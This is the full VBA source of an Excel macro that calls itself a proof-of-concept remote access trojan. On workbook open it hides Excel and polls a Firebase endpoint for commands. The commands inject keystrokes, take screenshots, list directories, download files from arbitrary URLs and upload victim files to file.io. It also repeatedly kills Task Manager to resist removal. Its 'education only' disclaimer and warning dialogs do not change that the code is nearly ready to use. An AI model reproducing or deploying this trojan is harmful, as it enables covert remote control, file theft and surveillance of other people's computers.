Option Explicit
' !!! DEMONSTRATION & EDUCATION ONLY
' !!! NO SCRIPT KIDDIES BEING MALICIOUS.
' FRICKING 64 bits >:(
#If Win64 Then
    Private Declare PtrSafe Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal _
            bScan   As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As LongPtr)
    
    Private Declare PtrSafe Function OleCreatePictureIndirect Lib "oleaut32.dll" (PicDesc As PicBmp, _
            RefIID  As Guid, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long
    Private Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal Hwnd As Long) As Long
    Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function CloseClipboard Lib "user32" () As Long
    Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
    Private Declare PtrSafe Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
    
#Else
    Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal _
            bScan   As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    
    Private Declare Function OleCreatePictureIndirect Lib "olepro32.dll" (PicDesc As PicBmp, _
            RefIID  As Guid, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long
    Private Declare Function OpenClipboard Lib "user32" (ByVal Hwnd As Long) As Long
    Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare Function CloseClipboard Lib "user32" () As Long
    Private Declare Function EmptyClipboard Lib "user32" () As Long
    Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA"
    (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
#End If

Private Const VK_MENU = &H12
Private Const VK_SNAPSHOT = &H2C
Private Const KEYEVENTF_KEYUP = &H2
Private Const CF_BITMAP = 2
Private Type PicBmp
    Size            As Long
Type                As Long
    hBmp            As Long
    hPal            As Long
    Reserved        As Long
End Type
Private Type Guid
    Data1           As Long
    Data2           As Integer
    Data3           As Integer
    Data4(0 To 7)   As Byte
End Type

'End of bitmap bs
Dim lastVal         As String
                                        Const firebaseUrl = "https://YOUR ID.firebaseio.com/"        ' CHANGE ONLY THIS!!
Dim currentDirectory As String

Function PlayWavFile(sPath As String, Wait As Boolean) As Boolean        ' Used in audio payload
    
    'make sure file exists
    If Dir(sPath) = "" Then
        Exit Function
    End If
    
    If Wait Then
        'hold up follow-on code until sound complete
        sndPlaySound sPath, 0
    Else
        'continue with code run while sound is playing
        sndPlaySound sPath, 1
    End If
    
End Function

' Downloading files
Sub downloadFile(myURL As String, savePath As String)
    Dim oStream     As Object
    Dim WinHttpReq  As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, FALSE
    WinHttpReq.Send
    
    myURL = WinHttpReq.ResponseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile (savePath)
        oStream.Close
    End If
End Sub

Sub test()        ' RUN IT. DO NOT USE EXIT SUB!!
    Dim act         As Object
    Dim getGot      As String
    getGot = getHTTP(firebaseUrl & "action.json")
    If getGot = lastVal Then Exit Sub
    Set act = JsonConverter.ParseJson(getGot)
    
    'Normal payloads
    If act("actionType") = "keyboard" Then
        ' Sendkeys
        SendKeys act("actionContent")
    ElseIf act("actionType") = "playsound" Then
        PlayWavFile act("actionContent"), FALSE
        
        '--------- Files -----------
    ElseIf act("actionType") = "cd" Then
        
        'Changedir
        If Dir(act("actionContent")) = vbNullString Then
            respondToIt "Directory does Not exist", currentDirectory
        Else
            currentDirectory = act("actionContent")
            respondToIt "Directory changed", currentDirectory
        End If
        
    ElseIf act("actionType") = "ls" Then
        ' List files
        respondToIt "Directory listing of " & currentDirectory, JsonConverter.ConvertToJson(getFiles(currentDirectory))
    ElseIf act("actionType") = "screenshot" Then
        SaveScreenshot currentDirectory & act("actionContent") & ".bmp"
        respondToIt "Screenshot saved To " & currentDirectory & act("actionContent") & ".bmp", currentDirectory
        
    ElseIf act("actionType") = "download" Then
        'Download a file to the current directory. Action content is url,filename
        respondToIt "Downloading...", currentDirectory
        DoEvents
        ' Wait for client to update
        Application.Wait (Now + TimeValue("00:00:05"))
        DoEvents
        ' Now we just download the file
        Dim parts() As String
        parts = Split(act("actionContent"), ",")        ' Split into url(0), filename(1)
        
        downloadFile parts(0), currentDirectory & parts(1)
        respondToIt "Download complete.", currentDirectory
        
    ElseIf act("actionType") = "retrieve" Then
        ' Clone a file to the controller
        If Dir(act("actionContent")) = vbNullString Then
            respondToIt "File does Not exist", currentDirectory
        Else
            ' Upload
            respondToIt "Uploading...", currentDirectory
            DoEvents
            ' Wait for client to update
            Application.Wait (Now + TimeValue("00:00:05"))
            DoEvents        ' we really don't want a crash
            respondToIt "Upload complete.", FileIOUpload(act("actionContent"))        ' Upload
            
        End If
    End If
    lastVal = getGot
End Sub

Public Function getHTTP(ByVal url As String) As String
    ' DONT EDIT THIS
    With CreateObject("MSXML2.XMLHTTP")
        .Open "GET", url, False: .Send
        getHTTP = StrConv(.ResponseBody, vbUnicode)
    End With
End Function

Public Function respondToIt(ByVal responseTxt As String, ByVal contentTxt As String) As String
    ' EDIT THIS!
    Dim jsontosend  As String
    Dim dict        As New Scripting.Dictionary
    dict.Add "content", contentTxt        ' What we want
    dict.Add "responseText", responseTxt        ' What human reads
    jsontosend = JsonConverter.ConvertToJson(dict)
    With CreateObject("MSXML2.XMLHTTP")
        .Open "PUT", firebaseUrl & "response.json", FALSE
        .SetRequestHeader "Content-Type", "application/json"
        .Send (jsontosend)
    End With
End Function
Function IsProcessRunning(process As String)        ' Used for anti task man
    Dim objList     As Object
    
    Set objList = GetObject("winmgmts:") _
        .ExecQuery("select * from win32_process where        '" & process & "'")
    
    If objList.Count > 0 Then
        IsProcessRunning = TRUE
    Else
        IsProcessRunning = FALSE
    End If
    
End Function

Sub murderTaskMan()        ' There's no stopping us now
    If IsProcessRunning("Taskmgr.exe") Then
        ' It's running. Kill it
        Dim oServ   As Object
        Dim cProc   As Variant
        Dim oProc   As Object
        
        Set oServ = GetObject("winmgmts:")
        Set cProc = oServ.ExecQuery("Select * from Win32_Process")
        
        For Each oProc In cProc
            If oProc.Name = "Taskmgr.exe" Then
                oProc.Terminate
            End If
        Next
    End If
End Sub

Function FileIOUpload(path As String) As String
    FileIOUpload = JsonConverter.ParseJson(pvPostFile("https://file.io", path))("link")
End Function
Private Function pvPostFile(sUrl As String, sFileName As String, Optional ByVal bAsync As Boolean) As String
    Const STR_BOUNDARY  As String = "3fbd04f5-b1ed-4060-99b9-fca7ff59c113"
    Dim nFile           As Integer
    Dim baBuffer()      As Byte
    Dim sPostData       As String
    
    '--- read file
    nFile = FreeFile
    Open sFileName For Binary Access Read As nFile
    If LOF(nFile) > 0 Then
        ReDim baBuffer(0 To LOF(nFile) - 1) As Byte
        Get nFile, , baBuffer
        sPostData = StrConv(baBuffer, vbUnicode)
    End If
    Close nFile
    '--- prepare body
    sPostData = "--" & STR_BOUNDARY & vbCrLf & _
    "Content-Disposition: form-data; name=""file""; filename=""" & Mid$(sFileName, InStrRev(sFileName, "\") + 1) & """" & vbCrLf & _
    "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & _
    sPostData & vbCrLf & _
    "--" & STR_BOUNDARY & "--"
    '--- post
    With CreateObject("Microsoft.XMLHTTP")
        .Open "POST", sUrl, bAsync
        .SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & STR_BOUNDARY
        .Send pvToByteArray(sPostData)
        If Not bAsync Then
            pvPostFile = .ResponseText
        End If
    End With
End Function

Private Function pvToByteArray(sText As String) As Byte()
    pvToByteArray = StrConv(sText, vbFromUnicode)
End Function

Public Function jsonParse(ByVal jsonText As String) As Object
    jsonParse = JsonConverter.ParseJson(jsonText)
End Function

Sub RunEveryTwoMinutes()
    'Run it
    currentDirectory = ""
    Do
        test
        DoEvents
        'Main stuff has been done so now anti task man for 5 secs before rechecking
        Dim i
        For i = 1 To 5
            Application.Wait (Now + TimeValue("00:00:01"))
            murderTaskMan
            DoEvents
        Next
        DoEvents
    Loop
End Sub

Function getFiles(dire) As String()
    Dim i           As Integer
    Dim arr         As String
    Dim StrFile     As String
    StrFile = Dir(dire, vbDirectory)
    arr = ""
    Do While Len(StrFile) > 0
        arr = arr & StrFile & "]"
        StrFile = Dir
        i = i + 1
    Loop
    getFiles = Split(arr, "]")        'return array
End Function
Public Function SaveScreenshot(ByVal pth As String)
    Dim Pic         As PicBmp, IPic As IPicture, IID_IDispatch As Guid, strFileName As String
    Dim theCnt      As Integer, theMsg As String
    theCnt = 0
    strFileName = pth
    startOver:
    theCnt = theCnt + 1
    keybd_event VK_MENU, 0, 0, 0        'press Alt
    keybd_event VK_SNAPSHOT, 0, 0, 0        'press PrintScrn
    keybd_event VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0        'release it
    keybd_event VK_MENU, 0, KEYEVENTF_KEYUP, 0        'release it
    DoEvents
    With IID_IDispatch
        .Data1 = &H20400
        .Data4(0) = &HC0
        .Data4(7) = &H46
    End With
    With Pic
        Call OpenClipboard(0&)
        .Size = Len(Pic)
        .Type = 1
        .hBmp = GetClipboardData(CF_BITMAP)
    End With
    OleCreatePictureIndirect Pic, IID_IDispatch, 1, IPic        ' Create the picture object
    DoEvents
    On Error GoTo errorEncountered
    stdole.SavePicture IPic, strFileName        ' Save the file
    errorEncountered:
    Call EmptyClipboard        ' Empty the clipboard
    Call CloseClipboard        ' Close the clipboard
End Function

Private Sub Workbook_Open()
    If MsgBox("WARNING: This file Is a proof of concept REMOTE ACCESS TROJAN. If you Do Not know what this Is Or what this does, CLICK NO As you could potentially be allowing an attacker into your system. If you understand the risks, click YES To test this RAT On your system And YOUR SYSTEM ONLY. The malicious use of the RAT Is AGAINST THE LAW.", vbYesNo + vbExclamation, "WARNING") = vbYes Then
        If MsgBox("ARE YOU SURE?", vbYesNo) = vbYes Then
            MsgBox "The application will now close. Have your controller ready And ensure all actions are reset."
            Application.Visible = FALSE
            RunEveryTwoMinutes
        End If
    End If
End Sub
